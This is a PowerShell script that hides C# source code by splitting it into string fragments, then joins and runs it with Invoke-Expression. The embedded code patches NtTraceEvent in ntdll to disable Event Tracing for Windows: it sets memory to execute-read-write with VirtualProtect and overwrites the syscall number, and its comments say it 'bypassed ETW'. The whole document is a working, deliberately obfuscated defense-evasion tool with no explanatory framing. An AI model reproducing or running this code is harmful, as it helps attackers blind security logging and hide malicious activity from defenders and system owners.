$fragments = @('$Code = @"
using Sy','stem;
usin','g System.Ru','ntime.Inter','opServices;','

namespa','ce Test
{','
    public',' class Prog','ram
    {','
        [U','nmanagedFun','ctionPointe','r(CallingCo','nvention.St','dCall)]
  ','      publi','c delegate ','bool Virtua','lProtect(In','tPtr lpAddr','ess, UIntPt','r dwSize, u','int flNewPr','otect, out ','uint lpflOl','dProtect);','

        ','[DllImport(','"kernel32.d','ll", CharSe','t = CharSet','.Ansi, Exac','tSpelling =',' true, SetL','astError = ','true)]
   ','     public',' static ext','ern IntPtr ','GetProcAddr','ess(IntPtr ','hModule, st','ring procNa','me);

   ','     [DllIm','port("kerne','l32.dll", C','harSet = Ch','arSet.Auto)',']
        ','public stat','ic extern I','ntPtr GetMo','duleHandle(','string lpMo','duleName);','

        ','private con','st byte x64','_RET_INSTRU','CTION_OPCOD','E = 0xC3;  ','      // ''r','et'' - instr','uction opco','de
       ',' private co','nst byte x6','4_MOV_INSTR','UCTION_OPCO','DE = 0xB8; ','       // ''','mov'' - inst','ruction opc','ode
      ','  private c','onst int x6','4_SYSCALL_S','TUB_SIZE = ','0x20;      ','        // ','size of a s','yscall stub',' is 32

 ','       publ','ic static b','ool PatchET','W()
      ','  {
      ','      uint ','dwOldProtec','tion = 0x00',';
        ','    IntPtr ','pNtTraceEve','nt = IntPtr','.Zero;

 ','           ','// Get the ','address of ','"NtTraceEve','nt"
      ','      IntPt','r hNtdll = ','GetModuleHa','ndle("NTDLL','");
      ','      if (h','Ntdll == In','tPtr.Zero)','
          ','      retur','n false;
','
          ','  pNtTraceE','vent = GetP','rocAddress(','hNtdll, "Nt','TraceEvent"',');
       ','     if (pN','tTraceEvent',' == IntPtr.','Zero)
    ','           ',' return fal','se;

    ','        // ','Read the fu','nction byte','s to search',' for the MO','V instructi','on
       ','     byte[]',' functionBy','tes = new b','yte[x64_SYS','CALL_STUB_S','IZE];
    ','        Mar','shal.Copy(p','NtTraceEven','t, function','Bytes, 0, x','64_SYSCALL_','STUB_SIZE);','

       ','     IntPtr',' ssnAddress',' = IntPtr.Z','ero;
     ','       bool',' found = fa','lse;

   ','         //',' Search for',' NtTraceEve','nt''s SSN po','inter
    ','        for',' (int i = 0','; i < x64_S','YSCALL_STUB','_SIZE; i++)','
         ','   {
     ','           ','if (functio','nBytes[i] =','= x64_MOV_I','NSTRUCTION_','OPCODE)
  ','           ','   {
     ','           ','    // Set ','the pointer',' to NtTrace','Event''s SSN',' and break','
          ','          s','snAddress =',' new IntPtr','(pNtTraceEv','ent.ToInt64','() + i + 1)',';
        ','           ',' found = tr','ue;
      ','           ','   break;
','           ','     }

 ','           ','    // If w','e reached t','he ''ret'' or',' ''syscall'' ','instruction',', we fail
','           ','     if (fu','nctionBytes','[i] == x64_','RET_INSTRUC','TION_OPCODE',' ||
      ','           ','   function','Bytes[i] ==',' 0x0F ||
 ','           ','        fun','ctionBytes[','i] == 0x05)','
         ','       {
 ','           ','        ret','urn false;','
          ','      }
  ','          }','

       ','     if (!f','ound)
    ','           ',' return fal','se;

    ','        //C','onsole.Writ','eLine("[+] ','Found NtTra','ceEvent''s S','SN address:',' 0x{0}", ss','nAddress.To','String("X")',');

     ','       // A','pply the pa','tch (0xFF b','ytes)
    ','        byt','e[] patch =',' new byte[4','] { 0xFF, 0','xFF, 0xFF, ','0xFF };

','           ',' IntPtr pKe','rnelDll = G','etModuleHan','dle("kernel','32.dll");
','           ',' IntPtr pVi','rtualProtec','t = GetProc','Address(pKe','rnelDll, "V','irtualProte','ct");

  ','          V','irtualProte','ct fVirtual','Protect = (','VirtualProt','ect)Marshal','.GetDelegat','eForFunctio','nPointer(pV','irtualProte','ct, typeof(','VirtualProt','ect));

 ','           ','// Change m','emory prote','ction to al','low writing','
         ','   if (!fVi','rtualProtec','t(ssnAddres','s, (UIntPtr',')patch.Leng','th, 0x40, o','ut dwOldPro','tection)) /','/ PAGE_EXEC','UTE_READWRI','TE
       ','         re','turn false;','

       ','     // Wri','te the patc','h
        ','    Marshal','.Copy(patch',', 0, ssnAdd','ress, patch','.Length);
','
         ','   // Resto','re original',' protection','
         ','   fVirtual','Protect(ssn','Address, (U','IntPtr)patc','h.Length, d','wOldProtect','ion, out dw','OldProtecti','on);

   ','         //','Console.Wri','teLine("[+]',' Successful','ly unhooked',' ETW at 0x{','0}!", pNtTr','aceEvent.To','String("X")',');
       ','     //Cons','ole.WriteLi','ne("[+] Suc','cessfully b','ypassed ETW',' on Windows','.");

   ','         re','turn true;','
        }','
    }
}
','"@

try {','
    Add-T','ype -TypeDe','finition $C','ode -Refere','ncedAssembl','ies "System','.Runtime.In','teropServic','es"
    $r','esult = [Te','st.Program]','::PatchETW(',')
    if (','$result) {','
        Wr','ite-Host "E','TW patch su','ccessful!" ','-Foreground','Color Green','
    } els','e {
      ','  Write-Hos','t "ETW patc','h failed." ','-Foreground','Color Red
','    }
} ca','tch {
    ','Write-Host ','"Error: $($','_.Exception','.Message)" ','-Foreground','Color Red
','}'); $script = $fragments -join ''; Invoke-Expression $script